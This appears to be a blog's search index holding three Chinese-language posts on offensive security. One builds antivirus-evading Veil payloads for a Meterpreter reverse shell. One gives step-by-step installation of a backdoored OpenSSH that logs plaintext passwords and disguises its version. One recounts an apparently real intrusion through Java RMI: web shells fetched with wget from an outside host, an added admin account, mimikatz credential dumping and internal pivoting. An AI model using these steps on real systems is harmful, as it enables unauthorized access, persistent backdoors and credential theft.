<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Veil3.1免杀安装]]></title>
    <url>%2F2018%2F03%2F23%2FVeil3.1%E5%85%8D%E6%9D%80%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[听说很难安装。 准备工作下载最新3.1版本的VeilGithub：https://github.com/Veil-Framework/Veil.git 配置环境安装之前先更新一下包，执行命令apt-get update下载配置Veil所需的包，不然会报错，在终端输入：apt-get install libncurses5*apt-get install libavutil55*apt-get install gcc-mingw-w64*apt-get install wine32如果下载失败就挂个代理，应该没什么问题。这里要说的是红酒瓶wine，如果安装失败就使用如下三条命令：dpkg --add-architecture i386 apt-get update apt-get install wine32 输入命令wine --version查看是否安装成功。 安装解压Veil安装包unzip Veil-master.zip，cd到Veil-master/setup目录运行./setup.sh y回车安装需要点时间，喝杯水。 紧接着，一直疯狂的按next，让它安装。这里就不一一截图了。 看到这步点击finish了,然后继续安装。安装成功 运行在Veil-master文件夹下终端输入./Veil.py运行输入use 1然后 list查看payload这里测试生成个exeuse 5，然后输入IP地址和端口这里输入要生成的文件名生成成功 测试将生成的exe丢进win7运行，然后kali运行msf开启监听set payload windows/meterpreter/reverse_httpset lhost 192.11.22.64set lport 8888run成功反弹shell整个过程大致就这样，下次见。]]></content>
      <categories>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>Veil</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenSSH后门的安装]]></title>
    <url>%2F2018%2F03%2F22%2FOpenSSH%E5%90%8E%E9%97%A8%E7%9A%84%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[本来想结合实战一起写出来的，但提权过程中出现了些问题，所以就单独写吧。 本机环境：centos6.5 OpenSSH_5.3p1 准备工作下载openssh的安装包和后门安装包。安装包:http://www.openssh.com后门安装包:http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz 为了伪装在安装后门之前，先查看本机的ssh版本号ssh-V 解压安装包tar zxvf openssh-5.9p1.tar.gztar zxvf 0x06-openssh-5.9p1.patch.tar.gz 注入后门将后门文件夹的sshbd5.9p1.diff复制到openssh-5.9p1文件夹中，并在该openssh-5.9p1文件夹执行patch &lt;sshbd5.9p1.diff命令 修改版本号和后门密码在openssh-5.9p1文件夹中执行vim version.h修改版本号（为了伪装，这里修改成一开始记下来的版本号），修改后门密码和记录密码的保存路径vim includes.hilog是记录别的机子登录本机的密码olon是记录本机登录到别的机子的密码（这应该能理解吧） 安装在安装之前先安装配置环境，不然会报错。yum install -y openssl openssl-devel pam-develyum install zlib-develyum install gccyum install opensslyum install openssl-devel 安装及编译：./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 显示到这个说明编译成功，然后执行make和make install命令安装 测试后门kali链接ssh查看登录过来的ssh密码cat /tmp/ilog还是明文的OK!大功告成 特别注意的是，整个过程都是在root用户下执行的，不然没有权限执行。]]></content>
      <categories>
        <category>后门</category>
      </categories>
      <tags>
        <tag>liunx后门</tag>
        <tag>OpenSSH</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JAVARMI漏洞之旅]]></title>
    <url>%2F2018%2F03%2F17%2FJAVARMI%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%97%85%2F</url>
    <content type="text"><![CDATA[博客刚搭建不久，有些美工还没做。##其实我不想在搞了，搭建个博客麻烦得要死。 今天周末天气不错，兜兜转转也不懂要做什么。最近在研究RMI反序列化漏洞，就写一片文章吧。 突破口在一次nmap扫描过程中发现了目标机子8100端口存在java RMI服务于是用attackRMI.jar链接该端口，成功回显系统信息 执行cat /proc/version id 命令 写马失败Liunx的版本号比较低，User权限，ifconfig：10.xx.xx.13内网机子，对系统的基本信息了解之后，接下来就尝试着echo写一句话到web路径下（用菜刀连接，方便操作，因为使用attackRMI.jar只能在当前目录下操作，不能cd到别的目录），echo 一句话&gt;&gt;/xxx/xxx/tomcat/webapps/root/xxx.jsp（web路径疯狂ls才找到的） 运行完之后发现文件是创建了，但是字节为0 经过一番尝试之后发现echo命令用不了。 不能写内容到文件里去，于是想到了wget命令，wget http://xxx.xxx.xxx/xxx.jsp -O /xxx/xxx/tomcat/webapps/root/xxx.jsp（其中肉鸡的地址是http 马名字为xxx.jsp），运行后发现并没有成功写入到文件，排查原因发现该机子根本就不通外网。内网机子做了端口映射。 马儿出不了，那就翻翻有啥利用的东西。在经过疯狂的ls之后找到了几个数据库密码： 转机既然突破不了，为何不去扫扫C段？果然在其同网段的一台机子的8800端口发现了同样的漏洞：说干就干，运气不错，系统权限windows 2008 32位 没有域 netstat -ano对方开了3389添加用户net user admln admin /add &amp; net localgoup administrators admln /add成功添加用户之后用mstsc命令远程链接发现报错：原来该机子没有把自己的3389端口映射出来，不好的情况发生了，这台和之前的一样不能通外网，正当想办法的时候，小伙伴在该C段拿下了台liunx的机子，通过端口漏洞jdwp，过程大致说下，该漏洞是远程执行命令的，然后通过执行命令找到web服务的根路径，向其写入一句话。乌云有篇关于jdwp的文章，有兴趣的去看下。 内网游游在已拿下的liunx机子上安装了reGeorg代理，然后通过代理远程链接之前的win 08机子 用到mimikatz获取管理员的哈希及明文密码 之前写马失败的那台，通过wget到内网机子里获取到一句话,也成功拿下了。 内网很大，这里就不继续写下去了。 刮好大的风啊，准备要下雨了，走人走人。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>RMI漏洞</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
</search>
